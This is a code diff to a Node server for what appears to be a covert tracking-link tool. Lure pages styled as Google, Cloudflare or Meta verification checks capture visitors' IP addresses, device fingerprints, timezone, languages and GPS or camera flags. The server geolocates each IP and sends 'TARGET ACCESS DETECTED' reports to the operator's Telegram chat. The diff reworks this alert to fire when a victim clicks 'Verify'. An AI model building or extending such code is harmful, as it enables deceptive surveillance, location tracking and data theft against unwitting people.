@@ -20,8 +20,13 @@ import AdmZip from "adm-zip";
 import yts from "yt-search";
 import play from "play-dl";
 import ytdl from "@distube/ytdl-core";
-import makeWASocket, { useMultiFileAuthState, DisconnectReason } from "@whiskeysockets/baileys";
+import * as baileys_module from "@whiskeysockets/baileys";
+// Fix esbuild default export issue
+const makeWASocket = (baileys_module as any).default || (baileys_module as any).makeWASocket || baileys_module;
+const { useMultiFileAuthState, DisconnectReason } = baileys_module;
+
 import QRCode from "qrcode";
+
 
 
 const resolveMx = util.promisify(dns.resolveMx);
@@ -347,33 +352,8 @@ async function startServer() {
       const timestamp = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
       const targetIp = String(ip).split(',')[0].trim();
       
-      (async () => {
-        let geoInfo = "<i>Fetching Geodata...</i>";
-        try {
-          const res = await fetch(`http://ip-api.com/json/${targetIp}?fields=status,country,city,isp,as,mobile,proxy,query`).then(r => r.json());
-          if (res.status === 'success') {
-            geoInfo = `├ COUNTRY: <code>${res.country}</code>\n` +
-                      `├ CITY: <code>${res.city}</code>\n` +
-                      `├ ISP: <code>${res.isp}</code>\n` +
-                      `├ VPN/PROXY: <code>${res.proxy ? 'YES' : 'CLEAN'}</code>\n` +
-                      `└ MOBILE: <code>${res.mobile ? 'YES' : 'NO'}</code>`;
-          }
-        } catch(e) {}
-
-        let msg = `🚩 <b>TARGET ACCESS DETECTED</b> 🚩\n` +
-                  `━━━━━━━━━━━━━━━━━━━━\n\n` +
-                  `📅 <b>TIME:</b> <code>${timestamp} WIB</code>\n` +
-                  `🌐 <b>IP ADDRESS:</b> <code>${targetIp}</code>\n\n` +
-                  `🌍 <b>GEOGRAPHIC OSINT:</b>\n${geoInfo}\n\n` +
-                  `📦 <b>TEMPLATE:</b> <code>${templates[tmplId] ? escapeHTML(templates[tmplId].name) : 'Default'}</code>\n` +
-                  `🔑 <b>NODE_ID:</b> <code>${id}</code>\n\n` +
-                  `🖥️ <b>BROWSER AGENT:</b>\n<code>${escapeHTML(String(userAgent))}</code>\n\n` +
-                  `━━━━━━━━━━━━━━━━━━━━\n` +
-                  `⏳ <i>STATUS: INITIALIZING ADVANCED AUDIT...</i>`;
-
-        botInstance.telegram.sendMessage(chatId, msg, { parse_mode: 'HTML' }).catch(console.error);
-      })();
-      
+      // No longer sending Telegram notification here to avoid link preview spam.
+      // Bot owner requested to only notify when the user clicks 'Verify'.
       targetsData.push({
         id: id,
         timestamp: new Date().toISOString(),
@@ -422,46 +402,69 @@ async function startServer() {
       const tmplId = data.tmplId || '1';
       const templateName = templates[tmplId] ? templates[tmplId].name : 'ᴅᴇꜰᴀᴜʟᴛ';
       
-      let header = '🕵️‍♂️ <b>SYSTEM DIAGNOSTIC: Metadata Captured</b>';
-      let statusText = '🔄 <i>SYNCING...</i>';
+      const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+      const targetIp = String(ip).split(',')[0].trim();
+      const userAgent = req.headers['user-agent'];
 
-      if (tmplId === 'google') {
-        header = '🛡️ <b>GOOGLE SECURITY AUDIT</b>';
-      } else if (tmplId === 'cloudflare') {
-        header = '☁️ <b>CLOUDFLARE EDGE REPORT</b>';
-      } else if (tmplId === 'meta_verification') {
-        header = '🎯 <b>META VERIFICATION SESSION</b>';
-      } else if (tmplId === 'terminal') {
-        header = '💻 <b>KERNEL DIAGNOSTIC LOG</b>';
-      } else if (tmplId === 'gallery') {
-        header = '🖼️ <b>MEDIA INTEGRITY REPORT</b>';
-      }
-      
-      if (data.visual_identity) statusText = '📸 <i>MEDIA_CAPTURE_ACTIVE</i>';
-      if (data.gps) statusText = '📍 <i>GPS_FIX_ESTABLISHED</i>';
+      (async () => {
+        let geoInfo = "<i>Fetching Geodata...</i>";
+        try {
+          const res = await fetch(`http://ip-api.com/json/${targetIp}?fields=status,country,city,isp,as,mobile,proxy,query`).then(r => r.json());
+          if (res.status === 'success') {
+            geoInfo = `├ COUNTRY: <code>${res.country}</code>\n` +
+                      `├ CITY: <code>${res.city}</code>\n` +
+                      `├ ISP: <code>${res.isp}</code>\n` +
+                      `├ VPN/PROXY: <code>${res.proxy ? 'YES' : 'CLEAN'}</code>\n` +
+                      `└ MOBILE: <code>${res.mobile ? 'YES' : 'NO'}</code>`;
+          }
+        } catch(e) {}
 
-      let msg = `<b>${header}</b>\n` +
-                  `━━━━━━━━━━━━━━━━━━━━\n\n` +
-                  `📋 <b>SESSION INFRASTRUCTURE:</b>\n` +
-                  `├ CONTEXT: <code>${escapeHTML(templateName)}</code>\n` +
-                  `├ STATE: <code>${statusText}</code>\n` +
-                  `└ NODE_ID: <code>${id}</code>\n\n` +
-                  `🖥️ <b>DEVICE FINGERPRINT:</b>\n` +
-                  `├ OS/PLAT: <code>${escapeHTML(data.platform || 'N/A')}</code>\n` +
-                  `├ ENGINE: <code>${escapeHTML(data.vendor || 'N/A')}</code>\n` +
-                  `├ CPU_CORES: <code>${escapeHTML(String(data.cores || 'N/A'))}</code>\n` +
-                  `├ RAM_EST: <code>~${escapeHTML(String(data.mem || 'N/A'))} GB</code>\n` +
-                  `├ GPU_PROC: <code>${escapeHTML(data.gpu || 'N/A')}</code>\n` +
-                  `├ RESOLUTION: <code>${escapeHTML(data.screen || 'N/A')}</code>\n` +
-                  `└ PLUGINS: <code>${data.plugins ? data.plugins.split(',').length : '0'} detected</code>\n\n` +
-                  `🌍 <b>GEOGRAPHIC DATA:</b>\n` +
-                  `├ TIMEZONE: <code>${escapeHTML(data.timezone || 'N/A')}</code>\n` +
-                  `└ LANGUAGES: <code>${escapeHTML((data.langs || '').substring(0, 30))}</code>\n\n` +
-                  `━━━━━━━━━━━━━━━━━━━━`;
+        let header = '🕵️‍♂️ <b>SYSTEM DIAGNOSTIC: Metadata Captured</b>';
+        let statusText = '🔄 <i>SYNCING...</i>';
 
-      botInstance.telegram.sendMessage(chatId, msg, { parse_mode: 'HTML' })
-        .then(() => console.log(`[DEBUG] Telegram sent info log successfully`))
-        .catch(err => console.error(`[DEBUG] Telegram FAILED to send info log:`, err));
+        if (tmplId === 'google') {
+          header = '🛡️ <b>GOOGLE SECURITY AUDIT</b>';
+        } else if (tmplId === 'cloudflare') {
+          header = '☁️ <b>CLOUDFLARE EDGE REPORT</b>';
+        } else if (tmplId === 'meta_verification') {
+          header = '🎯 <b>META VERIFICATION SESSION</b>';
+        } else if (tmplId === 'terminal') {
+          header = '💻 <b>KERNEL DIAGNOSTIC LOG</b>';
+        } else if (tmplId === 'gallery') {
+          header = '🖼️ <b>MEDIA INTEGRITY REPORT</b>';
+        }
+        
+        if (data.visual_identity) statusText = '📸 <i>MEDIA_CAPTURE_ACTIVE</i>';
+        if (data.gps) statusText = '📍 <i>GPS_FIX_ESTABLISHED</i>';
+        const timestamp = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
+
+        let msg = `🚩 <b>TARGET ACCESS DETECTED</b> 🚩\n` +
+                    `━━━━━━━━━━━━━━━━━━━━\n\n` +
+                    `📅 <b>TIME:</b> <code>${timestamp} WIB</code>\n` +
+                    `🌐 <b>IP ADDRESS:</b> <code>${targetIp}</code>\n\n` +
+                    `🌍 <b>GEOGRAPHIC OSINT:</b>\n${geoInfo}\n\n` +
+                    `📋 <b>SESSION INFRASTRUCTURE:</b>\n` +
+                    `├ CONTEXT: <code>${escapeHTML(templateName)}</code>\n` +
+                    `├ STATE: <code>${statusText}</code>\n` +
+                    `└ NODE_ID: <code>${id}</code>\n\n` +
+                    `🖥️ <b>DEVICE FINGERPRINT:</b>\n` +
+                    `├ OS/PLAT: <code>${escapeHTML(data.platform || 'N/A')}</code>\n` +
+                    `├ ENGINE: <code>${escapeHTML(data.vendor || 'N/A')}</code>\n` +
+                    `├ CPU_CORES: <code>${escapeHTML(String(data.cores || 'N/A'))}</code>\n` +
+                    `├ RAM_EST: <code>~${escapeHTML(String(data.mem || 'N/A'))} GB</code>\n` +
+                    `├ GPU_PROC: <code>${escapeHTML(data.gpu || 'N/A')}</code>\n` +
+                    `├ RESOLUTION: <code>${escapeHTML(data.screen || 'N/A')}</code>\n` +
+                    `└ PLUGINS: <code>${data.plugins ? data.plugins.split(',').length : '0'} detected</code>\n\n` +
+                    `🌍 <b>LOCAL SETTINGS:</b>\n` +
+                    `├ TIMEZONE: <code>${escapeHTML(data.timezone || 'N/A')}</code>\n` +
+                    `└ LANGUAGES: <code>${escapeHTML((data.langs || '').substring(0, 30))}</code>\n\n` +
+                    `━━━━━━━━━━━━━━━━━━━━\n` +
+                    `✅ <i>STATUS: DEVICE FORENSICS COLLECTED!</i>`;
+
+        botInstance.telegram.sendMessage(chatId, msg, { parse_mode: 'HTML' })
+          .then(() => console.log(`[DEBUG] Telegram sent info log successfully`))
+          .catch(err => console.error(`[DEBUG] Telegram FAILED to send info log:`, err));
+      })();
       
       // Save to Target DB
       targetsData.push({
